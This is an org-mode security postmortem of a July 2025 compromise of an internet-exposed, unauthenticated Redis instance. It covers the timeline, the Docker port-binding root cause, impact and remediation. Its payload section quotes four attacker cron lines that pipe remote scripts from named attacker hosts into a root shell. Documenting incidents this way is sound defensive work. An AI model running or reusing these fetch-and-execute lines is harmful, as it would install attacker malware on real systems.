#+TAGS: security incident redis postmortem

* Executive Summary
On July 20, 2025, our Redis instance was compromised by external attackers who gained unauthorized access through an exposed port. The attackers injected malicious cron job payloads in an attempt to gain code execution on our server. The attack was contained due to Docker containerization and has been fully remediated.

** Incident Details
- *Date:* July 20, 2025
- *Duration:* ~2 hours (09:20 - 11:20 UTC)  
- *Severity:* High
- *Status:* Resolved

* Timeline
| Time (UTC)        | Event                                                                    |
|-------------------+--------------------------------------------------------------------------|
| July 16, 09:43    | *Root Cause*: Redis port 6379 exposed to internet via commit =0cf674127= |
| July 20, 09:20    | *Attack Begins*: External IP =109.244.159.27= compromises Redis          |
| July 20, 09:20-11:17 | *Persistence*: Redis configured as replica of attacker's server          |
| July 20, 11:17    | *Discovery*: User restarts Twenty service, notices Redis errors         |
| July 20, 11:20    | *Investigation*: Malicious Redis keys discovered during troubleshooting |
| July 20, 12:00-13:00 | *Remediation*: Firewall rules implemented, malicious keys deleted       |
| July 20, 13:05    | *Resolution*: External access blocked, services restored                |

* Root Cause Analysis
** Primary Cause
Redis was exposed to the internet without authentication due to Docker port binding configuration:

#+BEGIN_SRC nix
# In arion-compose.nix (commit 0cf674127)
redis = {
  service = {
    image = "redis:latest";
    ports = [ "6379:6379" ];  # Bound to 0.0.0.0:6379 (ALL interfaces)
  };
};
#+END_SRC

** Contributing Factors
1. *No Redis Authentication*: Redis ran with default configuration (no password)
2. *Docker Firewall Bypass*: Docker bypassed NixOS firewall rules by default
3. *Overly Broad Port Binding*: Services bound to all interfaces instead of localhost
4. *Missing Security Review*: Port exposure commit lacked security consideration

* Attack Analysis
** Attack Vector: Redis Configuration Manipulation
A well-known attack pattern targeting exposed Redis instances:

1. *Discovery*: Automated scanners found exposed Redis on port 6379
2. *Access*: No authentication required for Redis commands  
3. *Payload Injection*: Malicious cron jobs stored as Redis keys
4. *Persistence*: Redis configured as replica of =109.244.159.27:21880=
5. *Attempted Execution*: Attackers tried to save payloads as system cron files

** Malicious Payloads Found
#+BEGIN_EXAMPLE
backup1: "*/2 * * * * root curl -fsSL http://pyats.top/ep9TS2/init.sh | sh"
backup2: "*/3 * * * * root wget -q -O- http://natalstatus.org/ep9TS2/ndt.sh | sh"  
backup3: "*/4 * * * * root curl -fsSL http://45.83.122.25/ep9TS2/init.sh | sh"
backup4: "*/5 * * * * root wd1 -q -O- http://185.19.33.145/ep9TS2/init.sh | sh"
#+END_EXAMPLE

** Attack Goals
- Cryptocurrency mining installation
- Backdoor creation (SSH keys, reverse shells)
- Data exfiltration  
- Lateral movement within infrastructure
- Botnet recruitment

** Why Attack Failed ✅
*Docker containerization prevented full compromise:*
- Redis container couldn't write to host =/var/spool/cron/crontabs/=
- Container isolation prevented file system escape
- Limited container permissions blocked system access
- No host network access for lateral movement

* Impact Assessment
** Security Impact ✅
- ✅ *No Code Execution*: Malicious payloads stored but never executed
- ✅ *No Data Breach*: No evidence of data access or exfiltration  
- ✅ *No System Compromise*: Host system remained secure
- ✅ *No Lateral Movement*: Attack contained within Redis container

** Service Impact ✅
- ✅ *No Service Disruption*: All services remained operational
- ✅ *No Data Loss*: Application data integrity maintained
- ⚠️ *Brief Deployment Issues*: Remediation caused temporary deployment failures

** Business Impact
- *Minimal*: No customer impact or downtime
- *Reputational*: Internal incident only, no external disclosure required

* Remediation Actions
** Immediate Actions (Day 1)
- [X] Deleted malicious Redis keys (=backup1-4=)
- [X] Stopped Redis replication to attacker server
- [X] Blocked external access via firewall

** Permanent Fix  
*Docker Firewall Integration*: Configured Docker to respect NixOS firewall:

#+BEGIN_SRC nix
virtualisation.docker.extraOptions = "--iptables=false";
#+END_SRC

** Verification ✅
- ✅ External Redis access blocked (timeout on port 6379)
- ✅ External PostgreSQL access blocked (timeout on port 5432)  
- ✅ Internal services functioning (Twenty, Outline, n8n)
- ✅ No malicious keys in Redis

* Lessons Learned
** What Went Wrong ❌
1. *Insufficient Security Review*: Port exposure change wasn't evaluated for security impact
2. *Default Configurations*: Redis and Docker used insecure defaults
3. *Missing Security Documentation*: No guidelines for service exposure
4. *Inadequate Monitoring*: No alerting for unusual Redis activity

** What Went Right ✅
1. *Defense in Depth*: Docker containerization prevented full compromise
2. *Quick Detection*: Issue discovered within hours during routine maintenance  
3. *Effective Response*: Rapid investigation and remediation
4. *No Data Loss*: Security measures prevented actual harm

* Preventive Measures
** Immediate (Completed)
- [X] *Firewall Configuration*: Docker now respects NixOS firewall rules
- [X] *Port Audit*: All services reviewed for unnecessary external exposure
- [X] *Redis Cleanup*: All malicious keys removed and monitoring implemented

** Short Term (Next 30 days)
- [ ] *Redis Authentication*: Enable Redis password authentication
- [ ] *Security Monitoring*: Implement Redis access logging and alerting
- [ ] *Port Scanning Detection*: Add monitoring for port scan attempts
- [ ] *Security Documentation*: Create secure deployment guidelines

** Long Term (Next 90 days)
- [ ] *Security Reviews*: Mandatory security review for infrastructure changes
- [ ] *Automated Security Testing*: Integration of security scans in CI/CD
- [ ] *Network Segmentation*: Implement proper network isolation
- [ ] *Intrusion Detection*: Deploy comprehensive monitoring solution
